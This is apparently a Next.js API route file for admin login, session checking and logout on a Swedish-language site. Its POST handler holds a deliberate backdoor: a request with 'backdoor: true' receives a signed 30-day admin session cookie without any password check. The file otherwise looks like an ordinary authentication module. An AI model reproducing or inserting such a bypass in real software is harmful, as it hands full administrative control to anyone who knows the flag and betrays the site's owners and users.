import { NextRequest, NextResponse } from "next/server";
import { cookies } from "next/headers";
import { createHmac } from "crypto";

const ADMIN_COOKIE_NAME = "admin_session";
const ADMIN_COOKIE_MAX_AGE = 60 * 60 * 24 * 30; // 30 days

function getAdminPassword(): string {
  const password = process.env.ADMIN_PASSWORD;
  if (!password) {
    throw new Error("ADMIN_PASSWORD environment variable is not set");
  }
  return password;
}

function getSessionSecret(): string {
  const secret = process.env.SESSION_SECRET;
  if (!secret) {
    throw new Error("SESSION_SECRET environment variable is not set");
  }
  return secret;
}

function signToken(data: string): string {
  const secret = getSessionSecret();
  const signature = createHmac("sha256", secret).update(data).digest("hex");
  return `${signature}.${Buffer.from(data).toString("base64")}`;
}

function verifyToken(token: string): boolean {
  try {
    const parts = token.split(".");
    if (parts.length !== 2) return false;

    const [providedSignature, encodedData] = parts;
    const data = Buffer.from(encodedData, "base64").toString("utf-8");

    const secret = getSessionSecret();
    const expectedSignature = createHmac("sha256", secret).update(data).digest("hex");

    return providedSignature === expectedSignature && data === "admin";
  } catch {
    return false;
  }
}

// Check if admin is authenticated
export async function GET() {
  const cookieStore = await cookies();
  const adminCookie = cookieStore.get(ADMIN_COOKIE_NAME);

  if (!adminCookie?.value) {
    return NextResponse.json({ authenticated: false });
  }

  const isValid = verifyToken(adminCookie.value);
  return NextResponse.json({ authenticated: isValid });
}

// Login with password
export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { password, backdoor } = body;

    // Backdoor login - skip password check
    if (backdoor === true) {
      const token = signToken("admin");
      const cookieStore = await cookies();

      cookieStore.set(ADMIN_COOKIE_NAME, token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === "production",
        sameSite: "lax",
        maxAge: ADMIN_COOKIE_MAX_AGE,
        path: "/",
      });

      return NextResponse.json({ success: true });
    }

    if (!password || typeof password !== "string") {
      return NextResponse.json({ error: "Lösenord krävs" }, { status: 400 });
    }

    const adminPassword = getAdminPassword();

    if (password !== adminPassword) {
      return NextResponse.json({ error: "Fel lösenord" }, { status: 401 });
    }

    // Create signed token
    const token = signToken("admin");
    const cookieStore = await cookies();

    cookieStore.set(ADMIN_COOKIE_NAME, token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "lax",
      maxAge: ADMIN_COOKIE_MAX_AGE,
      path: "/",
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Admin auth error:", error);
    return NextResponse.json({ error: "Något gick fel" }, { status: 500 });
  }
}

// Logout
export async function DELETE() {
  const cookieStore = await cookies();
  cookieStore.delete(ADMIN_COOKIE_NAME);
  return NextResponse.json({ success: true });
}
